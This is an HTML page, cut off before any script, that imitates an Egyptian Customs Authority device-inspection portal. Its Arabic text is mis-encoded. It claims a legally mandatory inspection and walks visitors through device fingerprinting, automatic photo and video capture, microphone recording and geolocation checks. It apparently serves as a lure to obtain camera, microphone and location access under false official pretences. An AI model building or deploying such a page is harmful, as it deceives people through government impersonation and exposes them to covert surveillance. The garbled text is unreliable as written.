<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ù†Ø¸Ø§Ù… Ø§Ù„ÙØ­Øµ Ø§Ù„Ø´Ø§Ù…Ù„ - Ø§Ù„Ù‡ÙŠØ¦Ø© Ø§Ù„Ø¹Ø§Ù…Ø© Ù„Ù„Ø¬Ù…Ø§Ø±Ùƒ Ø§Ù„Ù…ØµØ±ÙŠØ©</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        /* ===== Ù†Ø¸Ø§Ù… Ø§Ù„Ø£Ù„ÙˆØ§Ù† Ø§Ù„Ø­ÙƒÙˆÙ…ÙŠ Ø§Ù„Ù…ØµØ±ÙŠ ===== */
        :root {
            --primary-blue: #00205B;
            --egypt-red: #CE1126;
            --egypt-gold: #D4AF37;
            --success: #28a745;
            --warning: #ffc107;
            --danger: #dc3545;
            --info: #17a2b8;
            --dark: #343a40;
            --light: #f8f9fa;
            --gradient-bg: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%);
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Cairo', sans-serif;
            background: var(--gradient-bg);
            color: #333;
            min-height: 100vh;
            line-height: 1.6;
        }
        
        /* Ø§Ù„Ù‡ÙŠØ¯Ø± Ø§Ù„Ø±Ø³Ù…ÙŠ Ø§Ù„Ù…Ø·ÙˆØ± */
        .government-header {
            background: linear-gradient(90deg, var(--primary-blue) 0%, #1a365d 100%);
            color: white;
            padding: 15px 0;
            border-bottom: 5px solid var(--egypt-gold);
            position: sticky;
            top: 0;
            z-index: 1000;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
        }
        
        .header-container {
            max-width: 1300px;
            margin: 0 auto;
            padding: 0 25px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
        }
        
        .logo-section {
            display: flex;
            align-items: center;
            gap: 20px;
        }
        
        .egypt-emblem {
            width: 70px;
            height: 70px;
            background: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            color: var(--egypt-red);
            border: 3px solid var(--egypt-gold);
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        }
        
        .header-text h1 {
            font-size: 24px;
            font-weight: 800;
            margin-bottom: 5px;
            letter-spacing: -0.5px;
        }
        
        .header-text p {
            font-size: 14px;
            opacity: 0.9;
            color: #e0e0e0;
        }
        
        .system-badge {
            background: linear-gradient(45deg, var(--egypt-red), #ff6b6b);
            color: white;
            padding: 8px 20px;
            border-radius: 25px;
            font-weight: 700;
            font-size: 14px;
            border: 2px solid var(--egypt-gold);
            box-shadow: 0 4px 15px rgba(206, 17, 38, 0.2);
        }
        
        /* Ø´Ø±ÙŠØ· Ø§Ù„ØªÙ†Ø¨ÙŠÙ‡ Ø§Ù„ÙˆØ·Ù†ÙŠ */
        .national-alert {
            background: linear-gradient(90deg, #ffc107, #fd7e14);
            color: #000;
            padding: 12px 0;
            text-align: center;
            font-weight: 700;
            font-size: 15px;
            border-bottom: 3px solid var(--egypt-red);
            position: relative;
            overflow: hidden;
        }
        
        .alert-content {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
        }
        
        .alert-content i {
            animation: spin 3s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* Ù†Ø¸Ø§Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø§Øª Ø§Ù„Ù…ØªØ·ÙˆØ±Ø© */
        .main-container {
            max-width: 1300px;
            margin: 30px auto;
            padding: 0 25px;
        }
        
        .inspection-card {
            background: white;
            border-radius: 20px;
            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.1);
            overflow: hidden;
            border: 3px solid var(--primary-blue);
            margin-bottom: 30px;
            position: relative;
            transition: transform 0.3s ease;
        }
        
        .inspection-card:hover {
            transform: translateY(-5px);
        }
        
        .card-header {
            background: linear-gradient(90deg, var(--primary-blue), #1a365d);
            color: white;
            padding: 30px 40px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        
        .card-header::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(212, 175, 55, 0.1) 0%, transparent 70%);
        }
        
        .header-icon {
            font-size: 56px;
            margin-bottom: 20px;
            color: var(--egypt-gold);
            animation: float 3s ease-in-out infinite;
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        
        .card-header h2 {
            font-size: 32px;
            margin-bottom: 15px;
            font-weight: 800;
            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
        }
        
        /* Ù†Ø¸Ø§Ù… Ø§Ù„Ø®Ø·ÙˆØ§Øª Ø§Ù„Ù…ØªÙ‚Ø¯Ù…Ø© */
        .advanced-steps {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 30px;
            margin: 50px 0;
            padding: 0 20px;
        }
        
        .step-card {
            background: var(--light);
            border-radius: 15px;
            padding: 30px;
            text-align: center;
            border: 2px solid #e0e0e0;
            transition: all 0.3s ease;
            position: relative;
            cursor: pointer;
            overflow: hidden;
        }
        
        .step-card:hover {
            transform: translateY(-10px);
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.15);
        }
        
        .step-card.active {
            border-color: var(--success);
            background: linear-gradient(135deg, rgba(40, 167, 69, 0.1), rgba(32, 201, 151, 0.1));
            box-shadow: 0 15px 30px rgba(40, 167, 69, 0.2);
        }
        
        .step-card.completed {
            border-color: var(--primary-blue);
            background: linear-gradient(135deg, rgba(0, 32, 91, 0.1), rgba(26, 54, 93, 0.1));
        }
        
        .step-badge {
            position: absolute;
            top: 15px;
            left: 15px;
            width: 40px;
            height: 40px;
            background: var(--primary-blue);
            color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 18px;
            border: 3px solid white;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        }
        
        .step-card.active .step-badge {
            background: var(--success);
        }
        
        .step-card.completed .step-badge {
            background: var(--primary-blue);
        }
        
        .step-icon {
            font-size: 48px;
            margin-bottom: 20px;
            height: 80px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .step-card:nth-child(1) .step-icon { color: #3498db; }
        .step-card:nth-child(2) .step-icon { color: #e74c3c; }
        .step-card:nth-child(3) .step-icon { color: #9b59b6; }
        .step-card:nth-child(4) .step-icon { color: #2ecc71; }
        .step-card:nth-child(5) .step-icon { color: #f39c12; }
        .step-card:nth-child(6) .step-icon { color: #1abc9c; }
        
        .step-title {
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 15px;
            color: var(--primary-blue);
        }
        
        .step-desc {
            font-size: 14px;
            color: #666;
            margin-bottom: 20px;
            min-height: 60px;
        }
        
        .step-status {
            display: inline-block;
            padding: 8px 20px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .status-pending { background: #f8f9fa; color: #6c757d; }
        .status-active { background: #d4edda; color: #155724; }
        .status-completed { background: #d1ecf1; color: #0c5460; }
        
        /* Ù…Ù†Ø·Ù‚Ø© Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø±Ø§Øª */
        .test-section {
            background: linear-gradient(135deg, #ffffff 0%, #f8f9fa 100%);
            border-radius: 15px;
            padding: 40px;
            margin: 40px 0;
            border: 2px solid #e0e0e0;
            position: relative;
            overflow: hidden;
        }
        
        .test-section::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 5px;
            background: linear-gradient(90deg, var(--primary-blue), var(--egypt-red));
        }
        
        .test-container {
            display: none;
            animation: fadeIn 0.5s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .test-container.active {
            display: block;
        }
        
        .test-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 2px solid #e9ecef;
        }
        
        .test-header h3 {
            color: var(--primary-blue);
            font-size: 24px;
            font-weight: 700;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .test-timer {
            background: var(--primary-blue);
            color: white;
            padding: 8px 20px;
            border-radius: 25px;
            font-weight: 600;
            font-size: 14px;
        }
        
        /* ØªØµÙ…ÙŠÙ…Ø§Øª Ø®Ø§ØµØ© Ù„ÙƒÙ„ Ø§Ø®ØªØ¨Ø§Ø± */
        .camera-test {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 30px;
        }
        
        .camera-preview {
            width: 100%;
            max-width: 800px;
            height: 450px;
            background: #000;
            border-radius: 15px;
            overflow: hidden;
            border: 3px solid var(--primary-blue);
            position: relative;
        }
        
        #cameraFeed, #videoPreview {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .camera-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 24px;
            text-align: center;
        }
        
        .microphone-test {
            text-align: center;
        }
        
        .volume-meter {
            width: 100%;
            max-width: 500px;
            height: 20px;
            background: #e9ecef;
            border-radius: 10px;
            margin: 30px auto;
            overflow: hidden;
            position: relative;
        }
        
        .volume-level {
            height: 100%;
            background: linear-gradient(90deg, #2ecc71, #f1c40f, #e74c3c);
            width: 0%;
            transition: width 0.1s;
            border-radius: 10px;
        }
        
        .location-test {
            text-align: center;
        }
        
        .map-container {
            width: 100%;
            height: 400px;
            background: #e9ecef;
            border-radius: 15px;
            margin: 30px 0;
            overflow: hidden;
            border: 2px solid #dee2e6;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }
        
        .map-placeholder {
            color: #6c757d;
            font-size: 18px;
        }
        
        /* Ø´Ø±ÙŠØ· Ø§Ù„ØªØ­ÙƒÙ… */
        .control-panel {
            background: white;
            border-radius: 15px;
            padding: 30px;
            margin: 40px 0;
            border: 2px solid #e9ecef;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
        }
        
        .control-buttons {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-top: 30px;
        }
        
        .control-btn {
            padding: 18px 25px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        
        .control-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.5s;
        }
        
        .control-btn:hover::before {
            left: 100%;
        }
        
        .btn-start {
            background: linear-gradient(135deg, var(--primary-blue), #1a365d);
            color: white;
            box-shadow: 0 8px 25px rgba(0, 32, 91, 0.3);
        }
        
        .btn-start:hover {
            transform: translateY(-3px);
            box-shadow: 0 12px 30px rgba(0, 32, 91, 0.4);
        }
        
        .btn-next {
            background: linear-gradient(135deg, var(--success), #20c997);
            color: white;
        }
        
        .btn-pause {
            background: linear-gradient(135deg, var(--warning), #fd7e14);
            color: #000;
        }
        
        .btn-stop {
            background: linear-gradient(135deg, var(--danger), #e83e8c);
            color: white;
        }
        
        /* Ø´Ø±ÙŠØ· Ø§Ù„ØªÙ‚Ø¯Ù… Ø§Ù„Ù…ØªÙ‚Ø¯Ù… */
        .advanced-progress {
            background: white;
            border-radius: 15px;
            padding: 30px;
            margin: 40px 0;
            border: 2px solid #e9ecef;
            position: relative;
        }
        
        .progress-stats {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .progress-bar-container {
            height: 12px;
            background: #e9ecef;
            border-radius: 6px;
            overflow: hidden;
            position: relative;
            margin: 20px 0;
        }
        
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, var(--primary-blue), var(--egypt-red));
            width: 0%;
            transition: width 0.8s ease;
            border-radius: 6px;
            position: relative;
        }
        
        .progress-bar::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
            animation: shimmer 2s infinite;
        }
        
        @keyframes shimmer {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }
        
        /* Ù„ÙˆØ­Ø© Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ø§Ù†Ø¨ÙŠØ© */
        .info-panel {
            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
            border-radius: 15px;
            padding: 30px;
            margin: 40px 0;
            border: 2px solid #dee2e6;
        }
        
        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }
        
        .info-card {
            background: white;
            border-radius: 10px;
            padding: 20px;
            border-left: 4px solid var(--primary-blue);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
        }
        
        /* Ø§Ù„ØªÙƒÙŠÙ Ù…Ø¹ Ø§Ù„Ø¬ÙˆØ§Ù„ */
        @media (max-width: 768px) {
            .header-container {
                flex-direction: column;
                text-align: center;
                gap: 20px;
            }
            
            .advanced-steps {
                grid-template-columns: 1fr;
            }
            
            .control-buttons {
                grid-template-columns: 1fr;
            }
            
            .camera-preview {
                height: 300px;
            }
            
            .test-header {
                flex-direction: column;
                gap: 15px;
                text-align: center;
            }
        }
        
        /* Ø§Ù„Ø®ØªÙ… Ø§Ù„Ù…Ø§Ø¦ÙŠ */
        .watermark {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) rotate(-45deg);
            font-size: 80px;
            color: rgba(0, 32, 91, 0.03);
            pointer-events: none;
            white-space: nowrap;
            z-index: -1;
            font-weight: 900;
            text-transform: uppercase;
        }
        
        /* Ø§Ù„ØªÙ†Ø¨ÙŠÙ‡Ø§Øª Ø§Ù„Ù…Ø®ÙÙŠØ© */
        .hidden-notification {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(0, 0, 0, 0.9);
            color: white;
            padding: 15px 25px;
            border-radius: 10px;
            max-width: 400px;
            z-index: 1000;
            display: none;
            animation: slideIn 0.3s ease;
            border-left: 4px solid var(--success);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }
        
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        /* Ø§Ù„Ù…Ø¤Ø´Ø±Ø§Øª */
        .indicators {
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
            margin: 20px 0;
        }
        
        .indicator {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 10px 20px;
            background: white;
            border-radius: 25px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
        }
        
        .indicator-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
        }
        
        .dot-green { background: var(--success); animation: pulse 2s infinite; }
        .dot-red { background: var(--danger); }
        .dot-yellow { background: var(--warning); }
        
        /* ØªØ­Ø³ÙŠÙ†Ø§Øª Ø¥Ø¶Ø§ÙÙŠØ© */
        .highlight {
            background: linear-gradient(120deg, #fdfd96 0%, #fdfd96 100%);
            padding: 2px 5px;
            border-radius: 3px;
            font-weight: 600;
        }
        
        .glow {
            animation: glow 2s infinite alternate;
        }
        
        @keyframes glow {
            from { box-shadow: 0 0 10px rgba(212, 175, 55, 0.5); }
            to { box-shadow: 0 0 20px rgba(212, 175, 55, 0.8); }
        }
    </style>
</head>
<body>
    <!-- Ø®ØªÙ… Ù…Ø§Ø¦ÙŠ -->
    <div class="watermark">Ù†Ø¸Ø§Ù… Ø§Ù„ÙØ­Øµ Ø§Ù„Ø´Ø§Ù…Ù„ - Ø§Ù„Ø¬Ù…Ø§Ø±Ùƒ Ø§Ù„Ù…ØµØ±ÙŠØ©</div>
    
    <!-- Ø§Ù„Ù‡ÙŠØ¯Ø± Ø§Ù„Ø±Ø³Ù…ÙŠ -->
    <header class="government-header">
        <div class="header-container">
            <div class="logo-section">
                <div class="egypt-emblem">
                    <i class="fas fa-landmark"></i>
                </div>
                <div class="header-text">
                    <h1>Ù†Ø¸Ø§Ù… Ø§Ù„ÙØ­Øµ Ø§Ù„Ø´Ø§Ù…Ù„ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ</h1>
                    <p>Ø§Ù„Ù‡ÙŠØ¦Ø© Ø§Ù„Ø¹Ø§Ù…Ø© Ù„Ù„Ø¬Ù…Ø§Ø±Ùƒ Ø§Ù„Ù…ØµØ±ÙŠØ© - ÙˆØ²Ø§Ø±Ø© Ø§Ù„Ù…Ø§Ù„ÙŠØ©</p>
                </div>
            </div>
            <div class="system-badge">
                <i class="fas fa-shield-alt"></i> Ø§Ù„Ù†Ø³Ø®Ø© Ø§Ù„Ù…ØªØ·ÙˆØ±Ø© Ù¢Ù Ù¢Ù¤
            </div>
        </div>
    </header>
    
    <!-- ØªÙ†Ø¨ÙŠÙ‡ ÙˆØ·Ù†ÙŠ -->
    <div class="national-alert">
        <div class="alert-content">
            <i class="fas fa-exclamation-triangle"></i>
            <span>ÙØ­Øµ Ø¥Ù„Ø²Ø§Ù…ÙŠ: Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø© ØªØ®Ø¶Ø¹ Ù„Ù„ÙØ­Øµ Ø§Ù„Ø´Ø§Ù…Ù„ Ø¨Ù…ÙˆØ¬Ø¨ Ø§Ù„Ù‚Ø§Ù†ÙˆÙ† Ø±Ù‚Ù… Ù¡Ù¥Ù¤ Ù„Ø³Ù†Ø© Ù¢Ù Ù¢Ù£</span>
            <i class="fas fa-exclamation-triangle"></i>
        </div>
    </div>
    
    <!-- Ø§Ù„Ù…Ø­ØªÙˆÙ‰ Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ -->
    <div class="main-container">
        <!-- Ø¨Ø·Ø§Ù‚Ø© Ø§Ù„ÙØ­Øµ Ø§Ù„Ù…ØªÙ‚Ø¯Ù…Ø© -->
        <div class="inspection-card">
            <div class="card-header">
                <div class="header-icon">
                    <i class="fas fa-search-plus"></i>
                </div>
                <h2>Ù†Ø¸Ø§Ù… Ø§Ù„ÙØ­Øµ Ø§Ù„Ø´Ø§Ù…Ù„ Ø§Ù„Ù…ØªÙƒØ§Ù…Ù„ Ù„Ù„Ø£Ø¬Ù‡Ø²Ø© Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠØ©</h2>
                <p>ÙØ­Øµ Ø´Ø§Ù…Ù„ ÙŠØ´Ù…Ù„ Ø¬Ù…ÙŠØ¹ Ø¬ÙˆØ§Ù†Ø¨ Ø§Ù„Ø¬Ù‡Ø§Ø² Ù„Ø¶Ù…Ø§Ù† Ø§Ù„Ù…Ø·Ø§Ø¨Ù‚Ø© Ù„Ù„Ù…ÙˆØ§ØµÙØ§Øª Ø§Ù„Ù‚ÙŠØ§Ø³ÙŠØ© Ø§Ù„Ù…ØµØ±ÙŠØ©</p>
            </div>
            
            <div class="card-content" style="padding: 40px;">
                <!-- Ù…Ø¤Ø´Ø±Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù… -->
                <div class="indicators">
                    <div class="indicator">
                        <div class="indicator-dot dot-green"></div>
                        <span>Ø§Ù„Ù†Ø¸Ø§Ù… Ø¬Ø§Ù‡Ø²</span>
                    </div>
                    <div class="indicator">
                        <div class="indicator-dot dot-yellow"></div>
                        <span>ÙÙŠ Ø§Ù†ØªØ¸Ø§Ø± Ø§Ù„Ø¥Ø°Ù†</span>
                    </div>
                    <div class="indicator">
                        <div class="indicator-dot dot-red"></div>
                        <span>Ø¥Ù„Ø²Ø§Ù…ÙŠ Ø¨Ø§Ù„ÙƒØ§Ù…Ù„</span>
                    </div>
                </div>
                
                <!-- Ø®Ø·ÙˆØ§Øª Ø§Ù„ÙØ­Øµ Ø§Ù„Ù…ØªÙ‚Ø¯Ù…Ø© -->
                <div class="advanced-steps">
                    <div class="step-card active" id="step1" onclick="showTest(1)">
                        <div class="step-badge">Ù¡</div>
                        <div class="step-icon">
                            <i class="fas fa-id-card-alt"></i>
                        </div>
                        <div class="step-title">Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²</div>
                        <div class="step-desc">ÙØ­Øµ ØªÙ„Ù‚Ø§Ø¦ÙŠ Ù„Ù…ÙˆØ§ØµÙØ§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² ÙˆØ§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ©</div>
                        <div class="step-status status-active">Ù†Ø´Ø· Ø§Ù„Ø¢Ù†</div>
                    </div>
                    
                    <div class="step-card" id="step2" onclick="showTest(2)">
                        <div class="step-badge">Ù¢</div>
                        <div class="step-icon">
                            <i class="fas fa-camera"></i>
                        </div>
                        <div class="step-title">Ø§Ù„ÙØ­Øµ Ø§Ù„Ø¨ØµØ±ÙŠ (ØµÙˆØ±Ø©)</div>
                        <div class="step-desc">Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© ØªÙ„Ù‚Ø§Ø¦ÙŠØ© Ù„Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ù…Ø·Ø§Ø¨Ù‚Ø© Ø§Ù„Ø¬Ù‡Ø§Ø²</div>
                        <div class="step-status status-pending">ÙÙŠ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±</div>
                    </div>
                    
                    <div class="step-card" id="step3" onclick="showTest(3)">
                        <div class="step-badge">Ù£</div>
                        <div class="step-icon">
                            <i class="fas fa-video"></i>
                        </div>
                        <div class="step-title">ÙØ­Øµ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ</div>
                        <div class="step-desc">ØªØ³Ø¬ÙŠÙ„ ÙÙŠØ¯ÙŠÙˆ Ù‚ØµÙŠØ± Ù„Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø¬ÙˆØ¯Ø© Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§</div>
                        <div class="step-status status-pending">ÙÙŠ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±</div>
                    </div>
                    
                    <div class="step-card" id="step4" onclick="showTest(4)">
                        <div class="step-badge">Ù¤</div>
                        <div class="step-icon">
                            <i class="fas fa-microphone"></i>
                        </div>
                        <div class="step-title">ÙØ­Øµ Ø§Ù„ØµÙˆØª</div>
                        <div class="step-desc">Ø§Ø®ØªØ¨Ø§Ø± Ø¬ÙˆØ¯Ø© Ø§Ù„Ù…ÙŠÙƒØ±ÙˆÙÙˆÙ† ÙˆØ§Ù„ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ØµÙˆØªÙŠ</div>
                        <div class="step-status status-pending">ÙÙŠ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±</div>
                    </div>
                    
                    <div class="step-card" id="step5" onclick="showTest(5)">
                        <div class="step-badge">Ù¥</div>
                        <div class="step-icon">
                            <i class="fas fa-map-marker-alt"></i>
                        </div>
                        <div class="step-title">Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ</div>
                        <div class="step-desc">Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬Ù‡Ø§Ø² Ø¯Ø§Ø®Ù„ Ø§Ù„Ø¬Ù…Ù‡ÙˆØ±ÙŠØ©</div>
                        <div class="step-status status-pending">ÙÙŠ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±</div>
                    </div>
                    
                    <div class="step-card" id="step6" onclick="showTest(6)">
                        <div class="step-badge">Ù¦</div>
                        <div class="step-icon">
                            <i class="fas fa-file-certificate"></i>
                        </div>
                        <div class="step-title">Ø¥ØµØ¯Ø§Ø± Ø§Ù„Ø´Ù‡Ø§Ø¯Ø©</div>
                        <div class="step-desc">Ø¥Ø¹Ø·Ø§Ø¡ Ø§Ù„Ø¬Ù‡Ø§Ø² ØªØ±Ø®ÙŠØµ ØªØ´ØºÙŠÙ„ Ù…Ø¹ØªÙ…Ø¯</div>
                        <div class="step-status status-pending">ÙÙŠ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±</div>
                    </div>
                </div>
                
                <!-- Ù…Ù†Ø·Ù‚Ø© Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø±Ø§Øª -->
                <div class="test-section">
                    <!-- Ø§Ø®ØªØ¨Ø§Ø± 1: Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² -->
                    <div class="test-container active" id="test1">
                        <div class="test-header">
                            <h3><i class="fas fa-id-card-alt"></i> Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²</h3>
                            <div class="test-timer" id="timer1">ÙŠØ¨Ø¯Ø£ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹</div>
                        </div>
                        <div style="text-align: center;">
                            <div style="font-size: 80px; color: var(--primary-blue); margin-bottom: 30px;">
                                <i class="fas fa-laptop-code"></i>
                            </div>
                            <h4 style="color: var(--primary-blue); margin-bottom: 20px;">Ø¬Ø§Ø±ÙŠ ÙØ­Øµ Ù…ÙˆØ§ØµÙØ§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²...</h4>
                            <div class="info-grid">
                                <div class="info-card">
                                    <i class="fas fa-microchip" style="color: var(--primary-blue); margin-bottom: 10px;"></i>
                                    <div style="font-weight: bold;" id="deviceInfo1">Ø§Ù„Ù…ØªØµÙØ­: Ø¬Ø§Ø±ÙŠ Ø§Ù„ÙØ­Øµ...</div>
                                </div>
                                <div class="info-card">
                                    <i class="fas fa-desktop" style="color: var(--primary-blue); margin-bottom: 10px;"></i>
                                    <div style="font-weight: bold;" id="deviceInfo2">Ø§Ù„Ø¯Ù‚Ø©: Ø¬Ø§Ø±ÙŠ Ø§Ù„ÙØ­Øµ...</div>
                                </div>
                                <div class="info-card">
                                    <i class="fas fa-globe" style="color: var(--primary-blue); margin-bottom: 10px;"></i>
                                    <div style="font-weight: bold;" id="deviceInfo3">Ø§Ù„Ù„ØºØ©: Ø¬Ø§Ø±ÙŠ Ø§Ù„ÙØ­Øµ...</div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Ø§Ø®ØªØ¨Ø§Ø± 2: Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ (ØµÙˆØ±Ø©) -->
                    <div class="test-container" id="test2">
                        <div class="test-header">
                            <h3><i class="fas fa-camera"></i> Ø§Ù„ÙØ­Øµ Ø§Ù„Ø¨ØµØ±ÙŠ - ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„ØµÙˆØ±</h3>
                            <div class="test-timer" id="timer2">--:--</div>
                        </div>
                        <div class="camera-test">
                            <div class="camera-preview">
                                <video id="cameraFeed" autoplay playsinline></video>
                                <div class="camera-overlay" id="cameraOverlay1">
                                    <i class="fas fa-camera" style="font-size: 48px; margin-bottom: 20px;"></i>
                                    <div>Ø¬Ø§Ø±ÙŠ ØªÙ‡ÙŠØ¦Ø© ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„ÙØ­Øµ Ø§Ù„Ø¨ØµØ±ÙŠ...</div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Ø§Ø®ØªØ¨Ø§Ø± 3: Ø§Ù„ÙÙŠØ¯ÙŠÙˆ -->
                    <div class="test-container" id="test3">
                        <div class="test-header">
                            <h3><i class="fas fa-video"></i> ÙØ­Øµ Ø¬ÙˆØ¯Ø© Ø§Ù„ÙÙŠØ¯ÙŠÙˆ</h3>
                            <div class="test-timer" id="timer3">--:--</div>
                        </div>
                        <div class="camera-test">
                            <div class="camera-preview">
                                <video id="videoPreview" autoplay playsinline></video>
                                <div class="camera-overlay" id="cameraOverlay2">
                                    <i class="fas fa-video" style="font-size: 48px; margin-bottom: 20px;"></i>
                                    <div>Ø¬Ø§Ø±ÙŠ ØªÙ‡ÙŠØ¦Ø© Ù†Ø¸Ø§Ù… ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ...</div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Ø§Ø®ØªØ¨Ø§Ø± 4: Ø§Ù„Ù…ÙŠÙƒØ±ÙˆÙÙˆÙ† -->
                    <div class="test-container" id="test4">
                        <div class="test-header">
                            <h3><i class="fas fa-microphone"></i> Ø§Ø®ØªØ¨Ø§Ø± Ø¬ÙˆØ¯Ø© Ø§Ù„ØµÙˆØª</h3>
                            <div class="test-timer" id="timer4">--:--</div>
                        </div>
                        <div class="microphone-test">
                            <div style="font-size: 80px; color: var(--primary-blue); margin-bottom: 30px;">
                                <i class="fas fa-microphone-alt"></i>
                            </div>
